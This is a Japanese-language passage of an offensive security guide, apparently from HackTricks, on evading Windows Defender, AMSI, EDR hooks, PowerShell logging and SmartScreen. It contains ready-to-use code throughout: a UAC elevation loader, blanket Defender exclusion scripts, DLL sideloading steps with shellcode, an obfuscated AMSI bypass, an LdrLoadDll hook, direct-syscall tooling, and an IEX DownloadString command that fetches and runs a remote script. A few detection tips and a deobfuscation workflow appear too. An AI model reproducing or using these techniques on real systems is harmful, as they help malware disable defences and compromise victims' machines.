# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは当初、** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって執筆されました！**

## Defenderを停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを装ってWindows Defenderの動作を停止するツール。
- [管理者の場合はDefenderを無効化](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前のインストーラー形式のUAC誘導

ゲームチートを装う公開ローダーは、署名されていないNode.js/Nexeインストーラーとして配布されることが多く、まず**ユーザーに昇格を要求**し、その後でDefenderを無効化します。流れは単純です。

1. `net session`で管理者コンテキストを確認します。このコマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗した場合はローダーが標準ユーザーとして実行されていることを示します。
2. 元のコマンドラインを維持したまま、`RunAs`動詞を使用して直ちに自身を再起動し、想定されるUACの同意プロンプトを表示します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」ソフトウェアをインストールしていると信じているため、通常このプロンプトを受け入れ、malwareにDefenderのpolicyを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブレターに対する包括的な `MpPreference` exclusions

権限を昇格すると、GachiLoader-styleのchainはserviceを完全に無効化するのではなく、Defenderのblind spotを最大化します。まずloaderはGUI watchdog（`taskkill /F /IM SecHealthUI.exe`）をkillし、続いて**極めて広範なexclusions**を追加することで、すべてのuser profile、system directory、removable diskをscan不能にします。
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察事項：

- このループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置されるあらゆる payload が無視されます**。
- `.sys` 拡張子の除外は将来を見据えたものであり、攻撃者は後から Defender に再度触れることなく、署名されていないドライバーをロードする選択肢を残せます。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に反映されるため、後続ステージでは、UAC を再度トリガーすることなく除外設定が維持されているかを確認したり、範囲を拡張したりできます。

Defender サービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際のリアルタイム検査がそれらのパスに触れることはありません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AV はファイルが malicious かどうかを確認するためにさまざまな手法を使用しています。static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis も使われます。

### **Static detection**

Static detection は、binary や script 内の既知の malicious な文字列や byte 配列を検出し、さらにファイル自体から情報（例：file description、company name、digital signatures、icon、checksum など）を抽出することで実現されます。つまり、既知の public tools を使用すると、それらはすでに分析され malicious としてフラグが付けられている可能性が高いため、より簡単に検出されることがあります。この種の検出を回避する方法はいくつかあります。

- **Encryption**

binary を encrypt すれば、AV がプログラムを検出する方法はなくなりますが、プログラムを decrypt して memory 上で実行するための何らかの loader が必要になります。

- **Obfuscation**

binary や script 内の文字列をいくつか変更するだけで AV を通過できる場合もありますが、何を obfuscate しようとしているかによっては、時間のかかる作業になります。

- **Custom tooling**

自分で tools を開発すれば、既知の bad signatures は存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defender の static detection に対するチェックには [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) が適しています。これは基本的にファイルを複数の segment に分割し、それぞれを個別に Defender に scan させます。これにより、binary 内のどの文字列や byte がフラグを付けられたのかを正確に確認できます。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を確認することを強く推奨します。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox 内で binary を実行し、malicious な活動（例：browser の passwords を decrypt して読み取ろうとする、LSASS に対して minidump を実行するなど）を監視することです。この部分への対応はやや難しい場合がありますが、sandbox を回避するためにできることをいくつか紹介します。

- **Sleep before execution** 実装方法によっては、AV の dynamic analysis を bypass する優れた方法になります。AV がファイルを scan できる時間は、ユーザーの workflow を中断しないよう非常に短く設定されています。そのため、長い sleep を使用すると binary の analysis を妨害できます。ただし、多くの AV sandbox は実装方法によって sleep を単純に skip できるという問題があります。
- **Checking machine's resources** 通常、Sandbox は利用できる resources が非常に少なく設定されています（例：< 2GB RAM）。そうでなければ、ユーザーの machine の動作が遅くなる可能性があるためです。ここでは非常に creative な方法も使えます。例えば CPU の temperature や fan speed を確認することもできます。sandbox 内ですべてが実装されているとは限りません。
- **Machine-specific checks** "contoso.local" domain に参加している workstation のユーザーを target にしたい場合、computer の domain を確認して指定したものと一致するかチェックできます。一致しなければ、program を exit させることができます。

Microsoft Defender の Sandbox の computername は HAL9TH であることが判明しています。そのため、detonation 前に malware で computer name を確認できます。名前が HAL9TH と一致する場合、Defender の sandbox 内にいることを意味するため、program を exit させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の非常に優れた tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この post で前述したように、**public tools** は最終的に **detected されます**。そのため、次のことを自問してください。

例えば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**？ それとも、あまり知られておらず、LSASS も dump できる別の project を使えるでしょうか。

おそらく、正解は後者です。mimikatz を例に取ると、AV や EDR に最も多く、あるいは最も多くの一つとして flag されている malware でしょう。project 自体は非常に cool ですが、AV を回避するために扱うのは nightmare でもあります。そのため、達成したいことに対する alternatives を探してください。

> [!TIP]
> evasion のために payloads を変更する際は、Defender の **automatic sample submission を無効にする**ようにしてください。そして、本当に、長期的に evasion を達成したいのであれば、**VIRUSTOTAL に UPLOAD しないでください**。特定の AV によって payload が detected されるか確認したい場合は、VM にその AV を install し、automatic sample submission を無効にして、結果に納得できるまでそこで test してください。

## EXEs vs DLLs

可能な場合は常に、evasion には **DLLs の使用を優先してください**。私の経験では、DLL files は通常 **検出・分析される可能性がはるかに低い**ため、payload に DLL として実行する方法がある場合、検出を回避するための非常に簡単な trick になります。

この image からわかるように、Havoc の DLL Payload は antiscan.me で 4/26 の detection rate ですが、EXE payload の detection rate は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL files を使ってさらに stealthier にするための tricks をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と malicious payload(s) を同じ場所に配置し、loader が使用する DLL search order を利用します。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使用して、DLL Sideloading の影響を受けやすい programs を確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、`"C:\Program Files\\"` 内で DLL hijacking の影響を受けるプログラムの一覧と、それらが読み込もうとする DLL files を出力します。

**DLL Hijackable/Sideloadable programs** は、ぜひ自分で **explore** することを強くおすすめします。この technique は適切に実行すれば非常に stealthy ですが、publicly known な DLL Sideloadable programs を使用すると、簡単に発見される可能性があります。

プログラムが読み込もうとする名前の malicious DLL を配置するだけでは、payload は読み込まれません。プログラムは、その DLL 内に特定の functions が存在することを期待するためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使用します。

**DLL Proxying** は、プログラムが proxy（malicious）DLL に対して行う calls を original DLL に転送します。これにより、プログラムの functionality を維持しつつ、payload の execution を処理できます。

ここでは、[@flangvik](https://twitter.com/Flangvik) による [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した steps です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドにより、2つのファイルが生成されます。DLL source code templateと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちの shellcode（[SGN](https://github.com/EgeBalci/sgn) で encoded）と proxy DLL は、[antiscan.me](https://antiscan.me) でどちらも 0/26 Detection rate でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading についての [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と、さらに詳しく学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を視聴することを**強くおすすめします**。

### Forwarded Exports の悪用（ForwardSideLoading）

Windows PE modules は、実際には「forwarders」である functions を export できます。これは code を指す代わりに、export entry が `TargetDll.TargetFunc` 形式の ASCII string を含むものです。caller が export を resolve すると、Windows loader は以下を実行します：

- まだ load されていない場合、`TargetDll` を load する
- `TargetFunc` をそこから resolve する

理解しておくべき主な動作：
- `TargetDll` が KnownDLL の場合、protected KnownDLLs namespace（例：ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll` が KnownDLL でない場合は、通常の DLL search order が使用されます。これには forward resolution を実行している module の directory も含まれます。

これにより、indirect sideloading primitive が可能になります。つまり、function が non-KnownDLL module name に forwarded されている signed DLL を見つけ、その signed DLL と、forwarded target module と完全に同じ名前の attacker-controlled DLL を同じ場所に配置します。forwarded export が invoke されると、loader は forward を resolve し、同じ directory からあなたの DLL を load して DllMain を実行します。<sup>[[13]](#references)</sup>

Windows 11 で確認された例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（copy-paste）:
1) 署名済みの system DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の DllMain で code execution を実行するには十分であり、DllMain をトリガーするために転送関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済みの LOLBin で forward をトリガーする：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) は side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` の解決中、loader は forward に従って `NCRYPTPROV.SetAuditingInterface` へ進む
- その後、loader は `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` の実行後にのみ "missing API" エラーが発生する

Hunting tips:
- target module が KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧表示されている。
- 次のような tooling を使用して forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- See the Windows 11 forwarder inventory to search for candidates: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知/防御のアイデア:
- LOLBins（例: rundll32.exe）が非システムパスから署名済みDLLをロードし、その後、そのディレクトリから同じベース名を持つKnownDLLs以外のDLLをロードする動作を監視する
- `rundll32.exe` → ユーザーが書き込み可能なパス配下の非システム `keyiso.dll` → `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンをアラートする
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでのwrite+executeを拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freezeを使用すると、ステルス性を保ちながらshellcodeをロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion は cat & mouse game に過ぎません。今日有効なものが明日には検出される可能性があるため、1つの tool だけに依存せず、可能であれば複数の evasion technique を chain してみてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR はしばしば `ntdll.dll` の syscall stub に **user-mode inline hook** を配置します。これらの hook を bypass するには、正しい **SSN** (System Service Number) をロードし、hook された export entrypoint を実行せずに kernel mode へ transition する **direct** または **indirect syscall stub** を生成できます。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 生成された stub に `syscall`/`sysenter`/`SVC #0` instruction を埋め込む (`ntdll` export に hit しない)。
- **Indirect**: `ntdll` 内にある既存の `syscall` gadget へ jump し、kernel transition が `ntdll` から発生したように見せる (heuristic evasion に有用)；**randomized indirect** は call ごとに pool から gadget を選択します。
- **Egg-hunt**: static な `0F 05` opcode sequence を disk 上に埋め込むことを避け、runtime に syscall sequence を resolve します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes を読み取る代わりに、syscall stub を virtual address 順に sort して SSN を推測します。
- **SyscallsFromDisk**: clean な `\KnownDlls\ntdll.dll` を map し、その `.text` から SSN を読み取った後、unmap します (memory 内のすべての hook を bypass)。
- **RecycledGate**: VA-sorted SSN inference と、stub が clean な場合の opcode validation を組み合わせ、hook されている場合は VA inference に fallback します。
- **HW Breakpoint**: `syscall` instruction に DR0 を設定し、VEH を使用して runtime に `EAX` から SSN を取得します。hook された bytes を parse する必要はありません。

SysWhispers4 の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。当初、AVは**ディスク上のファイル**しかスキャンできなかったため、何らかの方法でpayloadsを**直接in-memoryで**実行できれば、AVにはそれを防ぐための十分な可視性がなく、何もできませんでした。

AMSI機能は、以下のWindowsコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、ActiveXのインストール時の昇格）
- PowerShell（scripts、interactive use、dynamic code evaluation）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBA macros

これにより、antivirus solutionsは、scriptの内容を暗号化もobfuscationもされていない形式で公開することで、scriptの挙動を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで以下のalertが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、そのscriptを実行したexecutableへのpathが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルをdropしていませんが、それでもAMSIによってin-memoryで検知されました。

さらに、**.NET 4.8**以降では、C# codeもAMSIを通過します。これは、in-memory executionのために`Assembly.Load(byte[])`を使用する場合にも影響します。そのため、AMSIをevadeしたい場合のin-memory executionには、より低いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主にstatic detectionsで動作するため、loadしようとするscriptsを変更することは、detectionをevadeする有効な方法になります。

ただし、AMSIには複数のlayerがある場合でもscriptsをunobfuscateする機能があるため、方法によってはobfuscationが悪い選択肢になる可能性があります。このため、evadeはそれほど単純ではありません。とはいえ、場合によってはvariable namesをいくつか変更するだけで十分なこともあるため、何がどの程度flagされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）processにloadすることで実装されているため、unprivileged userとして実行していても簡単にtamperできます。AMSIの実装に存在するこのflawにより、researchersはAMSI scanningをevadeする複数の方法を発見しました。

**Forcing an Error**

AMSI initializationを強制的に失敗させる（amsiInitFailed）と、現在のprocessではscanが開始されなくなります。当初、これは[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な使用を防ぐためのsignatureを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするのに必要だったのは、powershell code 1 行だけでした。もちろん、この行自体が AMSI によって検出されるため、この technique を使用するには何らかの変更が必要です。

以下は、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した、modified AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
この投稿が公開されると、おそらくフラグが立てられるため、検知されないことを計画している場合はコードを公開しないでください。

**Memory Patching**

この technique は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されたもので、amsi.dll 内の「AmsiScanBuffer」function（ユーザーが提供した input のスキャンを担当）の address を見つけ、E_INVALIDARG の code を返す instructions で上書きします。これにより、実際のスキャン結果は 0 を返すようになり、clean な結果として解釈されます。

> [!TIP]
> より詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell で bypass するために使用される technique は他にも数多くあります。詳細については、[**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を防止して AMSI をブロックする（LdrLoadDll hook）

AMSI は `amsi.dll` が current process に load された後にのみ初期化されます。堅牢で language-agnostic な bypass 方法は、`ntdll!LdrLoadDll` に user-mode hook を配置し、要求された module が `amsi.dll` の場合に error を返すことです。その結果、AMSI は load されず、その process ではスキャンが実行されません。<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、custom loaders のいずれでも動作します（それ以外の場合に AMSI を load するものすべて）。
- stdin 経由で scripts を渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長い command-line artefacts を回避できます。
- LOLBins（例：`DllRegisterServer` を呼び出す `regsvr32`）経由で実行される loaders での使用例が確認されています。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** ツールは、AMSI を bypass する script も生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** ツールは、user-defined function、variables、characters expression をランダム化し、PowerShell keywords の character casing をランダムに適用することで signature を回避する、AMSI を bypass する script も生成します。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などの tool を使用して、現在の process の memory から検出された AMSI signature を削除できます。この tool は、現在の process の memory をスキャンして AMSI signature を探し、NOP instructions で上書きすることで、memory から効果的に削除します。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の list は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**Powershell version 2 を使用する**
PowerShell version 2 を使用すると AMSI は load されないため、AMSI にスキャンされずに scripts を実行できます。次のように実行できます：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題**にもなります。

PowerShell loggingをバイパスするには、以下の手法を使用できます。

- **Disable PowerShell Transcription and Module Logging**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2を使用するとAMSIがロードされないため、AMSIによるスキャンなしでスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用して、防御機能のないpowershellを起動します（これはCobal Strikeの`powerpick`が使用する方法です）。


## Obfuscation

> [!TIP]
> 複数のobfuscation手法ではデータを暗号化するため、バイナリのエントロピーが増加し、AVやEDRによる検知が容易になります。この点に注意し、暗号化はコード内の機密性が高い、または隠す必要がある特定のセクションにのみ適用することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用fork）を使用するmalwareを解析する際には、decompilerやsandboxを妨害する複数の保護レイヤーに遭遇することがよくあります。以下のworkflowにより、後からdnSpyやILSpyなどのツールでC#へdecompileできる、ほぼ元のILを確実に**復元できます**。<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内部で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使用して暗号化されたmetadata tablesを特定し、XOR keysを復元して、クリーンなassemblyを書き出します。
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には6つのanti-tamper parameters（`key0-key3`、`nameHash`、`internKey`）が含まれます。これは独自のunpackerを構築する際に役立ちます。

2.  Symbol / control-flow recovery – *clean* fileを**de4dot-cex**（ConfuserEx対応のde4dot fork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profileを選択します
• de4dotはcontrol-flow flatteningを元に戻し、元のnamespaces、classes、variable namesを復元し、constant stringsを復号します。

3.  Proxy-call stripping – ConfuserExは、decompilationをさらに妨害するため、直接的なmethod callsを軽量なwrappers（別名*proxy calls*）に置き換えます。**ProxyCall-Remover**で削除します。
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この手順の後には、不透明なwrapper functions（`Class8.smethod_10`など）ではなく、`Convert.FromBase64String`や`AES.Create()`のような通常の.NET APIが確認できるはずです。

4.  Manual clean-up – 生成されたバイナリをdnSpy上で実行し、large Base64 blobsや`RijndaelManaged`/`TripleDESCryptoServiceProvider`の使用箇所を検索して、*real* payloadの位置を特定します。malwareは、`<Module>.byte_0`内部で初期化されるTLV-encoded byte arrayとして保存していることがよくあります。

上記のchainにより、malicious sampleを実行する必要なくexecution flowを復元できます。これはoffline workstationで作業する際に役立ちます。

> 🛈  ConfuserExは`ConfusedByAttribute`というcustom attributeを生成します。これはsampleを自動的にtriageするためのIOCとして使用できます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)および改ざん防止によってソフトウェアセキュリティを向上させられる、[LLVM](http://www.llvm.org/) compilation suiteのオープンソースフォークを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用したりcompilerを変更したりせずに、`C++11/14` languageを使用してcompile時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成されたobfuscated operationsのレイヤーを追加し、applicationをcrackしようとする人物の作業を少し困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysを含むさまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意のexecutables向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用する、LLVM-supported languages向けのfine-grained code obfuscation frameworkです。ROPfuscatorは、通常のinstructionsをROP chainsに変換することでassembly code levelでprogramをobfuscateし、通常のcontrol flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで記述された.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをshellcodeに変換してからloadできます。

## SmartScreen & MoTW

インターネットからいくつかのexecutablesをdownloadして実行する際に、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的にmaliciousなapplicationsの実行からend userを保護することを目的としたsecurity mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachで動作します。つまり、一般的でないdownload applicationsはSmartScreenをtriggerし、end userにalertを表示してfileの実行を防ぎます（ただし、More Info -> Run anywayをクリックすればfileを実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)であり、インターネットからfilesをdownloadすると、download元のURLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption>インターネットからdownloadしたfileのZone.Identifier ADSを確認する。</figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名されたexecutablesは、**SmartScreenをtriggerしない**ことに注意してください。

payloadsにMark of The Webが付与されるのを防ぐ非常に効果的な方法は、ISOのような何らかのcontainer内にpayloadsをpackageすることです。これは、Mark-of-the-Web（MOTW）を**non NTFS** volumesに適用することが**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadsをoutput containersへpackageするtoolです。

使用例：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
